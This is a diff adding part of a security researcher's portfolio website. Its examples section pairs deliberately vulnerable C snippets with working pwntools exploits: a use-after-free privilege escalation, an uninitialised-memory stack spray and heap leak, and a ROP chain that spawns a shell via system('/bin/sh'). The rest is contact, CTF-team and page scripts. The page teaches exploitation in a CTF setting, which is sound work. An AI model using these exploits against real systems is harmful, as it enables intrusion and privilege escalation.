+<span class="c-kw">void</span> <span class="c-fn">check_admin</span>() {
+    <span class="c-kw">if</span> (active &amp;&amp; active->priv_level &gt; <span class="c-num">0</span>)  <span class="c-bug">// dangling deref</span>
+        puts(<span class="c-str">"admin access"</span>);
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline high">HIGH</span><div class="poc-meta-inline">x86_64 · glibc tcache · privilege escalation</div><div class="poc-desc-inline">Log out to free the Session chunk, then allocate a same-size buffer with priv_level set non-zero. The dangling active pointer reads our controlled data when check_admin() runs.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+p = process('./dangling')
+def login():         p.sendlineafter(b'> ', b'1')
+def logout():        p.sendlineafter(b'> ', b'2')
+def alloc_buf(data): p.sendlineafter(b'> ', b'3'); p.sendlineafter(b'data: ', data)
+def check():         p.sendlineafter(b'> ', b'4')
+login()
+logout()    # frees Session, leaves dangling ptr
+# Reclaim 8-byte chunk: { id=1337, priv_level=9999 }
+alloc_buf(p32(1337) + p32(9999))
+check()     # active->priv_level = 9999 → admin access
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- UNINITIALIZED MEMORY -->
+    <div class="ex-card" data-excat="mem">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type mem">MEMORY</span><span class="ex-title">Uninitialized Memory Usage</span><span class="ex-lang">C · stack/heap</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">Reading a variable before assignment uses whatever bytes happen to be in memory. Attackers who control prior allocations can influence these values to bypass checks or leak information.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-kw">int</span> <span class="c-fn">check_license</span>(<span class="c-kw">int</span> input) {
+    <span class="c-kw">int</span> valid;              <span class="c-bug">// BUG: uninitialised — stack garbage</span>
+    <span class="c-kw">if</span> (input == <span class="c-num">0xc0ffee</span>) valid = <span class="c-num">1</span>;
+    <span class="c-kw">return</span> <span class="c-bug">valid</span>;           <span class="c-bug">// stale stack data if wrong input</span>
+}
+<span class="c-kw">void</span> <span class="c-fn">heap_leak</span>() {
+    <span class="c-kw">char</span> *buf = <span class="c-fn">malloc</span>(<span class="c-num">64</span>); <span class="c-comment">// no zero-init</span>
+    <span class="c-fn">puts</span>(<span class="c-bug">buf</span>);              <span class="c-bug">// prints stale heap data</span>
+    <span class="c-fn">free</span>(buf);
+}</div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline medium">MEDIUM</span><div class="poc-meta-inline">x86_64 · stack spray · heap info-leak</div><div class="poc-desc-inline">Spray a known value onto the stack so the uninitialised variable picks it up. Separately, observe stale heap data leaking from prior allocations through the uncleared malloc() return.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+p = process('./uninit')
+def spray():  p.sendlineafter(b'> ', b'spray')
+def check():  p.sendlineafter(b'> ', b'check'); p.sendlineafter(b'input: ', b'0'); return p.recvline()
+def alloc_secret():  p.sendlineafter(b'> ', b'secret')
+def leak():   p.sendlineafter(b'> ', b'leak')
+# Stack spray: prime the stack with value 1 at `valid`s location
+spray()
+result = check()   # input=0 skips assignment; reads sprayed 1
+if b'licensed' in result:
+    log.success('Uninit stack var exploited')
+# Heap leak: write sensitive data, free, reallocate, print stale contents
+alloc_secret()
+leak()             # malloc(64) reclaims → stale SECRET_KEY printed
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+    <!-- ROP -->
+    <div class="ex-card" data-excat="rop">
+      <div class="ex-header" onclick="toggleEx(this)"><span class="ex-type rop">ROP</span><span class="ex-title">Return-Oriented Programming</span><span class="ex-lang">x86_64 · NX + ASLR bypass</span><span class="ex-toggle">▼</span></div>
+      <div class="ex-body"><div class="ex-body-inner">
+        <div class="ex-desc">When NX/DEP prevents executing shellcode, ROP chains together small existing code sequences ("gadgets") each ending in <code style="color:var(--green);font-size:.85em">ret</code>, giving Turing-complete execution without writing a single new byte of code.</div>
+        <div class="ex-tabs"><button class="ex-tab active" onclick="switchTab(this,'vuln')">VULNERABLE CODE</button><button class="ex-tab" onclick="switchTab(this,'poc')">EXPLOIT / POC</button></div>
+        <div class="ex-pane active" data-pane="vuln"><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block"><span class="c-comment">// gcc -o rop_target rop_target.c -no-pie -fno-stack-protector</span>
+<span class="c-kw">void</span> <span class="c-fn">vuln</span>() {
+    <span class="c-kw">char</span> buf[<span class="c-num">64</span>];
+    <span class="c-fn">read</span>(<span class="c-num">0</span>, buf, <span class="c-num">256</span>);  <span class="c-bug">// BUG: 256 into 64-byte buf</span>
+}
+<span class="c-kw">int</span> <span class="c-fn">main</span>() { <span class="c-fn">vuln</span>(); }
+
+<span class="c-comment">/* Stack after overflow:
+ *  ┌─────────────────────────────────┐
+ *  │  'A' × 72          (padding)    │
+ *  │  pop rdi ; ret                  │ gadget 1
+ *  │  &amp;"/bin/sh" in libc             │ rdi = "/bin/sh"
+ *  │  ret                            │ gadget 2 (stack align)
+ *  │  &amp;system() in libc              │ system("/bin/sh")
+ *  └─────────────────────────────────┘
+ * $ ROPgadget --binary ./rop_target | grep "pop rdi"
+ * (pwndbg) rop --grep "pop rdi"
+ */</span></div></div></div>
+        <div class="ex-pane" data-pane="poc"><span class="poc-sev-inline critical">CRITICAL</span><div class="poc-meta-inline">x86_64 · NX + ASLR · PIE off · no canary</div><div class="poc-desc-inline">Two-stage exploit. Stage 1 leaks puts() from GOT to defeat ASLR. Stage 2 builds pop rdi → /bin/sh → system() with a ret gadget for glibc 2.35+ stack alignment.</div><div class="code-wrap"><button class="code-copy-btn" onclick="copyCode(this)">COPY</button>
+<div class="code-block">#!/usr/bin/env python3
+from pwn import *
+elf  = ELF('./rop_target', checksec=False)
+libc = ELF('./libc-2.35.so', checksec=False)
+ld   = ELF('./ld-2.35.so', checksec=False)
+context.binary = elf; context.log_level = 'info'
+def conn():
+    if args.REMOTE: return remote('ctf.example.com', 1337)
+    return process([ld.path, elf.path], env={'LD_PRELOAD': libc.path})
+p = conn()
+pop_rdi  = 0x00000000004013d3   # pop rdi ; ret
+ret_gadg = 0x000000000040101a   # ret  (stack alignment)
+OFFSET   = 72
+# Stage 1 — leak puts() to break ASLR
+payload  = b'A' * OFFSET
+payload += p64(pop_rdi) + p64(elf.got['puts'])
+payload += p64(elf.plt['puts']) + p64(elf.sym['main'])
+p.send(payload)
+leak = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
+libc.address = leak - libc.sym['puts']
+assert libc.address & 0xfff == 0, 'bad libc base'
+log.success(f'libc @ {hex(libc.address)}')
+# Stage 2 — system("/bin/sh")
+bin_sh = next(libc.search(b'/bin/sh\x00'))
+system = libc.sym['system']
+payload2  = b'A' * OFFSET
+payload2 += p64(ret_gadg) + p64(pop_rdi) + p64(bin_sh) + p64(system)
+p.send(payload2)
+p.interactive()</div></div></div>
+      </div></div>
+    </div>
+
+  </div>
+</section>
+<hr class="divider">
+
+<!-- 05 PORTFOLIO -->
+<section id="portfolio">
+  <div class="section-header"><span class="section-num">05</span><span class="section-title">Portfolio</span><div class="section-line"></div></div>
+  <p style="color:var(--text-dim);font-size:.8rem;margin-bottom:1.5rem;border-left:2px solid var(--green);padding-left:1rem;">Write-ups, tools, scripts and research files.</p>
+  <div class="file-list-wrap">
+    <div class="file-list-header">
+      <span class="file-list-title">// FILES</span>
+      <span class="file-list-count" id="file-count"></span>
+    </div>
+    <ul class="file-list" id="file-list">
+      <li class="file-empty" id="file-empty"></li>
+    </ul>
+  </div>
+</section>
+<hr class="divider">
+
+<!-- 06 CONTACT -->
+<section id="contact">
+  <div class="section-header"><span class="section-num">06</span><span class="section-title">Contact</span><div class="section-line"></div></div>
+  <div class="contact-wrap">
+    <div class="contact-info">
+      <p>Open to vulnerability research collaborations, exploit development contracts, CTF team invitations, and responsible disclosure discussions. PGP available on request.</p>
+      <p>Response time: <span class="highlight">48h</span> (usually faster)</p>
+      <br>
+      <a href="mailto:j1gs4ws@proton.me" class="contact-email"><span>✉</span> j1gs4ws@proton.me</a>
+      <br><br>
+      <p class="dim" style="font-size:.7rem;margin-top:1rem;">// For sensitive disclosures, ProtonMail-to-ProtonMail<br>// for E2E encryption, or request PGP key.</p>
+    </div>
+    <div class="contact-form">
+      <div class="field"><span class="contact-label">Handle / Name</span><input type="text" placeholder="anon@0x00"></div>
+      <div class="field"><span class="contact-label">Subject</span><input type="text" placeholder="RE: collaboration / vuln / CTF..."></div>
+      <div class="field"><span class="contact-label">Message</span><textarea placeholder="// your message here"></textarea></div>
+      <button class="btn btn-primary" onclick="sendMsg(this)">SEND TRANSMISSION</button>
+    </div>
+  </div>
+  <div class="ctf-team-wrap">
+    <div class="ctf-team-inner">
+      <div>
+        <div class="ctf-team-badge"><span class="ctf-flag">⚑</span><div><div class="ctf-team-name">Crossed Escapists</div><div class="ctf-team-sub">UK-based CTF Team · Est. 2024</div></div></div>
+        <p class="ctf-team-desc">UK-based CTF team competing across pwn, rev, crypto and web. Looking for dedicated players — beginners welcome if you're hungry to learn.</p>
+        <div class="ctf-tags"><span class="ctf-tag">pwn</span><span class="ctf-tag">rev</span><span class="ctf-tag">crypto</span><span class="ctf-tag">web</span><span class="ctf-tag">forensics</span><span class="ctf-tag">UK-based</span></div>
+      </div>
+      <div>
+        <div class="ctf-how">
+          <div class="ctf-how-title">// How to join</div>
+          <div class="ctf-step"><span class="ctf-step-num">01</span><span>Email your handle, background, and areas of interest</span></div>
+          <div class="ctf-step"><span class="ctf-step-num">02</span><span>Include past CTF write-ups, scores, or relevant experience</span></div>
+          <div class="ctf-step"><span class="ctf-step-num">03</span><span>We'll reach back with an invite to comms and upcoming events</span></div>
+        </div>
+        <a href="mailto:j1gs4ws@proton.me" class="ctf-email-btn">
+          <span class="ctf-email-icon">✉</span>
+          <div><div style="font-size:.65rem;letter-spacing:2px;color:var(--text-dim);margin-bottom:.2rem;">TEAM RECRUITMENT</div><div>j1gs4ws@proton.me</div></div>
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <span>j1gs4w</span> // root access not required to read the manual.
+  <br><br>
+  <span style="opacity:.4">0x6A316773347700 // all research for educational purposes</span>
+  <br><br>
+  <div class="konami-hint">
+    <span class="konami-label">// EASTER EGG</span>
+    <span class="konami-keys"><kbd>↑</kbd><kbd>↑</kbd><kbd>↓</kbd><kbd>↓</kbd><kbd>←</kbd><kbd>→</kbd><kbd>←</kbd><kbd>→</kbd><kbd>B</kbd><kbd>A</kbd></span>
+    <span class="konami-desc">type the Konami code on your keyboard to spawn a root shell</span>
+  </div>
+</footer>
+
+<div id="root-overlay">
+  <div class="root-text" id="root-text"></div>
+  <div class="root-sub">// KONAMI CODE ACCEPTED — ROOT SHELL SPAWNED</div>
+  <button class="root-close" onclick="document.getElementById('root-overlay').classList.remove('show')">EXIT SHELL</button>
+</div>
+<div id="toast"></div>
+
+<script>
+// ── CURSOR ───────────────────────────────────────────
+const $cur=document.getElementById('cursor'),$dot=document.getElementById('cursor-dot');
+document.addEventListener('mousemove',e=>{$cur.style.left=e.clientX+'px';$cur.style.top=e.clientY+'px';$dot.style.left=e.clientX+'px';$dot.style.top=e.clientY+'px';});
+
+// ── CLOCK ────────────────────────────────────────────
+function tick(){const n=new Date();document.getElementById('nav-clock').textContent=`${String(n.getHours()).padStart(2,'0')}:${String(n.getMinutes()).padStart(2,'0')}:${String(n.getSeconds()).padStart(2,'0')}`;}
+tick();setInterval(tick,1000);
+
+// ── MATRIX RAIN ──────────────────────────────────────
+(()=>{
+  const cv=document.getElementById('matrix-canvas'),cx=cv.getContext('2d');
+  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]/\\|';
+  let cols,drops;
+  function resize(){cv.width=cv.offsetWidth||window.innerWidth;cv.height=cv.offsetHeight||window.innerHeight;cols=Math.floor(cv.width/16);drops=new Array(cols).fill(0).map(()=>Math.random()*cv.height/16|0);}
+  window.addEventListener('resize',resize);resize();
+  setInterval(()=>{cx.fillStyle='rgba(2,10,2,0.06)';cx.fillRect(0,0,cv.width,cv.height);cx.font='14px Share Tech Mono';for(let i=0;i<drops.length;i++){const c=chars[Math.random()*chars.length|0];cx.fillStyle=`rgba(0,255,65,${Math.random()*.7+.15})`;cx.fillText(c,i*16,drops[i]*16);if(drops[i]*16>cv.height&&Math.random()>.975)drops[i]=0;else drops[i]++;}},55);
+})();
+
+// ── SKILL BARS ───────────────────────────────────────
+new IntersectionObserver(e=>{if(e[0].isIntersecting)document.querySelectorAll('.skill-bar-fill').forEach(b=>setTimeout(()=>{b.style.width=b.dataset.pct+'%';},150));},{threshold:.3}).observe(document.getElementById('skill-bars'));
+
+// ── SPEC CARDS ───────────────────────────────────────
+document.querySelectorAll('.spec-card').forEach((c,i)=>{c.style.transitionDelay=`${i*.07}s`;new IntersectionObserver(([e])=>{if(e.isIntersecting)c.classList.add('visible');},{threshold:.1}).observe(c);});
+
+// ── LIVE TERMINAL ────────────────────────────────────
+const TB=document.getElementById('live-term-body'),TI=document.getElementById('term-input');
+let cmdHist=[],histIdx=-1;
+const FS={'about.txt':'Security researcher focused on RE and binary exploitation.','tools.txt':'IDA Pro · Ghidra · GDB · PWNDBG · pwntools · ROPgadget · AFL++','contact.txt':'j1gs4ws@proton.me','flag.txt':'j1gs4w{y0u_f0und_th3_fl4g_g00d_r3c0n_m8}','motd.txt':'Welcome to 0xdead.\nAll activity is logged.\nJust kidding. Or am I?'};
+const CMDS={help:()=>`<span style="color:var(--amber)">commands:</span>\n  whoami  id  pwd  uname -a  ls  ls -la\n  cat [file]  ps aux  netstat  history\n  echo [text]  date  uptime  clear  exit`,whoami:()=>'<span class="highlight">j1gs4w</span>',id:()=>'uid=0(<span class="highlight">root</span>) gid=0(root) groups=0(root),1337(hackers)',pwd:()=>'/home/j1gs4w',date:()=>new Date().toString(),uptime:()=>{const u=performance.now()/1000|0;return`${(u/3600|0).toString().padStart(2,'0')}:${((u%3600)/60|0).toString().padStart(2,'0')}:${(u%60).toString().padStart(2,'0')} up`;},clear:()=>{TB.innerHTML='';return null;},exit:()=>'<span style="color:var(--red)">logout (not really)</span>','sudo su':()=>'<span style="color:var(--green)">root@0xdead:~# [already root]</span>','uname -a':()=>'Linux 0xdead 6.6.0-pwn #1 SMP j1gs4w x86_64 GNU/Linux',ls:()=>'<span class="t-var">about.txt</span>  <span class="t-var">tools.txt</span>  <span class="t-var">contact.txt</span>  <span class="t-var">motd.txt</span>  <span style="color:var(--red)">flag.txt</span>  <span style="color:var(--amber)">exploits/</span>','ls -la':()=>`total 56\n-rw-r--r-- <span class="t-var">about.txt</span>\n-rw-r--r-- <span class="t-var">tools.txt</span>\n-rw-r--r-- <span class="t-var">contact.txt</span>\n-rw-r--r-- <span class="t-var">motd.txt</span>\n-r-------- <span style="color:var(--red)">flag.txt</span>\ndrwxr-xr-x <span style="color:var(--amber)">exploits/</span>`,'ps aux':()=>`j1gs4w  1337  4.2  ghidra\nj1gs4w  1338  2.1  ida64\nj1gs4w  1339  0.3  gdb ./vuln`,netstat:()=>`tcp  0.0.0.0:22     LISTEN\ntcp  127.0.0.1:4444 LISTEN`,history:()=>cmdHist.length?cmdHist.slice(-10).map((c,i)=>`  ${String(i+1).padStart(3,'0')} ${c}`).join('\n'):'  (empty)'};
+function tWrite(h){const d=document.createElement('div');d.innerHTML=h;TB.appendChild(d);TB.scrollTop=TB.scrollHeight;}
+function tExec(raw){const cmd=raw.trim();if(!cmd)return;cmdHist.push(cmd);histIdx=-1;tWrite(`<span class="t-prompt">j1gs4w@0xdead:~$</span> <span class="t-cmd">${esc(cmd)}</span>`);if(cmd.startsWith('cat ')){const f=cmd.slice(4).trim();FS[f]?tWrite(`<span class="t-output" style="white-space:pre">${esc(FS[f])}</span>`):tWrite(`<span style="color:var(--red)">cat: ${esc(f)}: No such file</span>`);return;}if(cmd.startsWith('echo ')){tWrite(`<span class="t-output">${esc(cmd.slice(5))}</span>`);return;}if(cmd.startsWith('sudo ')){const s=cmd.slice(5).trim();if(s==='su'||s==='-i'){tWrite(CMDS['sudo su']());return;}tWrite(`<span style="color:var(--red)">[sudo] password:</span>`);setTimeout(()=>tWrite(`<span style="color:var(--red)">Sorry, try again.</span>`),700);return;}const fn=CMDS[cmd];if(fn){const r=fn();if(r!==null)tWrite(`<span class="t-output" style="white-space:pre">${r}</span>`);}else tWrite(`<span style="color:var(--red)">bash: ${esc(cmd)}: command not found</span>`);}
+(async()=>{const lines=[`<span class="t-comment">// j1gs4w terminal — type 'help'</span>`,`<span class="t-output">ASLR: <span style="color:var(--amber)">disabled</span></span>`,''];for(const l of lines){await new Promise(r=>setTimeout(r,180));tWrite(l);}TI.focus();})();
+TI.addEventListener('keydown',e=>{if(e.key==='Enter'){tExec(TI.value);TI.value='';}else if(e.key==='ArrowUp'&&cmdHist.length){histIdx=Math.min(histIdx+1,cmdHist.length-1);TI.value=cmdHist[cmdHist.length-1-histIdx];}else if(e.key==='ArrowDown'){histIdx=Math.max(histIdx-1,-1);TI.value=histIdx>=0?cmdHist[cmdHist.length-1-histIdx]:'';}});
+document.getElementById('about').addEventListener('click',()=>{if(document.activeElement!==TI)TI.focus();});
+
+// ── CHEAT SHEET ──────────────────────────────────────
+function showCat(cat,btn){document.querySelectorAll('.cat-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.cheat-block').forEach(b=>{b.style.display=(cat==='all'||b.dataset.cat===cat)?'block':'none';});}
+document.querySelectorAll('.copy-line').forEach(line=>{line.addEventListener('click',()=>{navigator.clipboard.writeText(line.dataset.copy||line.textContent.replace(/⧉ copy/g,'').trim()).catch(()=>{});line.classList.add('copied-flash');showToast('⧉ Copied!');setTimeout(()=>line.classList.remove('copied-flash'),350);});});
+
+// ── ENCODER ──────────────────────────────────────────
+function runEncoder(){const raw=document.getElementById('enc-in').value;const ids=['enc-ascii','enc-hex','enc-bin','enc-b64','enc-dec','enc-rot'];if(!raw){ids.forEach(id=>document.getElementById(id).textContent='—');return;}let bytes;if(/^0x[0-9a-fA-F\s]+$/i.test(raw.trim())){const h=raw.replace(/^0x/i,'').replace(/\s/g,'');bytes=[];for(let i=0;i<h.length;i+=2)bytes.push(parseInt(h.slice(i,i+2),16)||0);}else if(/^0b[01\s]+$/.test(raw.trim())){const b=raw.replace(/^0b/,'').replace(/\s/g,'');bytes=[];for(let i=0;i<b.length;i+=8)bytes.push(parseInt(b.slice(i,i+8),2)||0);}else bytes=Array.from(new TextEncoder().encode(raw));const ascii=new TextDecoder('utf-8',{fatal:false}).decode(new Uint8Array(bytes));document.getElementById('enc-ascii').textContent=ascii||'(non-printable)';document.getElementById('enc-hex').textContent='0x'+bytes.map(b=>b.toString(16).padStart(2,'0')).join('');document.getElementById('enc-bin').textContent='0b'+bytes.map(b=>b.toString(2).padStart(8,'0')).join(' ');try{document.getElementById('enc-b64').textContent=btoa(String.fromCharCode(...bytes));}catch(e){document.getElementById('enc-b64').textContent='(overflow)';}document.getElementById('enc-dec').textContent=bytes.join(', ');document.getElementById('enc-rot').textContent=ascii.replace(/[a-zA-Z]/g,c=>{const base=c<='Z'?65:97;return String.fromCharCode(((c.charCodeAt(0)-base+13)%26)+base);});}
+function copyEnc(id){const v=document.getElementById(id).textContent;if(v==='—')return;navigator.clipboard.writeText(v).catch(()=>{});showToast('⧉ Copied!');}
+
+// ── EXAMPLES ─────────────────────────────────────────
+function filterEx(cat,btn){document.querySelectorAll('.ex-btn').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.ex-card').forEach(c=>{c.style.display=(cat==='all'||c.dataset.excat===cat)?'block':'none';});}
+function toggleEx(header){const body=header.nextElementSibling,tog=header.querySelector('.ex-toggle'),open=body.classList.toggle('open');tog.style.transform=open?'rotate(180deg)':'rotate(0deg)';}
+function switchTab(btn,pane){const inner=btn.closest('.ex-body-inner');inner.querySelectorAll('.ex-tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');inner.querySelectorAll('.ex-pane').forEach(p=>p.classList.remove('active'));const target=inner.querySelector(`.ex-pane[data-pane="${pane}"]`);if(target)target.classList.add('active');}
+
+// ── COPY CODE ────────────────────────────────────────
+function copyCode(btn){const code=btn.nextElementSibling.textContent;navigator.clipboard.writeText(code).catch(()=>{});const orig=btn.textContent;btn.textContent='✓ COPIED';btn.style.color='var(--green)';btn.style.borderColor='var(--green)';setTimeout(()=>{btn.textContent=orig;btn.style.color='';btn.style.borderColor='';},1500);}
+
+// ── PORTFOLIO — load from portfolio.json ─────────────
+(async()=>{
+  const list  = document.getElementById('file-list');
+  const count = document.getElementById('file-count');
+  try {
+    const res   = await fetch('portfolio.json');
+    if (!res.ok) throw new Error('not found');
+    const files = await res.json();
+    count.textContent = `${files.length} file${files.length!==1?'s':''}`;
+    list.innerHTML = '';
+    if (!files.length) { list.innerHTML='<li class="file-empty"></li>'; return; }
+    files.forEach(f => {
+      const ext  = (f.name||'').split('.').pop().toLowerCase();
+      const icon = {py:'🐍',js:'📜',txt:'📄',pdf:'📕',md:'📝',zip:'📦',gz:'📦',sh:'⚙️',c:'💻',cpp:'💻',rs:'🦀',py3:'🐍'}[ext]||'📁';
+      const kb   = f.size ? (f.size/1024).toFixed(1)+' KB' : '';
+      const li   = document.createElement('li');
+      li.className = 'file-item';
+      li.innerHTML = `<span class="file-item-icon">${icon}</span><div class="file-item-info"><div class="file-item-name">${esc(f.name)}</div><div class="file-item-meta">${kb}${kb&&f.date?' · ':''}${f.date||''}</div></div><a href="${esc(f.path)}" download="${esc(f.name)}" class="file-dl-btn">⬇ DL</a>`;
+      list.appendChild(li);
+    });
+  } catch(_) {
+    count.textContent = '';
+    list.innerHTML = '<li class="file-empty"></li>';
+  }
+})();
+
+// ── CONTACT ──────────────────────────────────────────
+function sendMsg(btn){btn.textContent='// INITIATING SECURE CHANNEL...';btn.style.opacity='.7';setTimeout(()=>{window.location.href='mailto:j1gs4ws@proton.me';setTimeout(()=>{btn.textContent='SEND TRANSMISSION';btn.style.opacity='1';},2000);},800);}
+
+// ── TOAST ────────────────────────────────────────────
+function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.style.display='block';clearTimeout(t._t);t._t=setTimeout(()=>{t.style.display='none';},1800);}
+
+// ── KONAMI CODE ──────────────────────────────────────
+const KONAMI=[38,38,40,40,37,39,37,39,66,65];let ki=0;
+document.addEventListener('keydown',e=>{if(e.keyCode===KONAMI[ki]){ki++;if(ki===KONAMI.length){ki=0;triggerRoot();}}else ki=0;});
+function triggerRoot(){const ov=document.getElementById('root-overlay'),rt=document.getElementById('root-text');ov.classList.add('show');rt.textContent='';const lines=['KONAMI CODE ACCEPTED','','> spawning root shell...','> uid=0(root) gid=0(root)','','WELCOME TO THE MACHINE','','j1gs4w@0xdead:~#'];let i=0;const iv=setInterval(()=>{if(i>=lines.length){clearInterval(iv);return;}rt.textContent+=lines[i]+'\n';i++;},260);}
+
+// ── HELPER ───────────────────────────────────────────
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+</script>
+</body>
+</html>
